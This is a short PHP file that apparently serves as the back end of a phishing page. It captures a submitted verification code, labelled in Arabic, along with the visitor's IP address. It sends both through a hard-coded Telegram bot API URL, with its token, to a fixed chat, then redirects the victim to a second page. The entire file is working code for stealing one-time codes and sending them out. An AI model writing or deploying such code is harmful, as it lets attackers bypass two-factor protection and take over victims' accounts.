<?php
define ('url',"https://api.telegram.org/bot6005353269:AAFd_h-DwBtn-MKkhWXyyZ9BG7BJCtomdiY/");
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
$input_code2 = $_POST['input_code2'];
$user_ip = $_SERVER['REMOTE_ADDR'];
$chat_id = '6028587347';
$message = urlencode("
 كود التاكيد : > ".$input_code2.
"

ايبي الجوال : ".$user_ip);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
}
?>
<script>
    window.location.replace("code.php");
</script>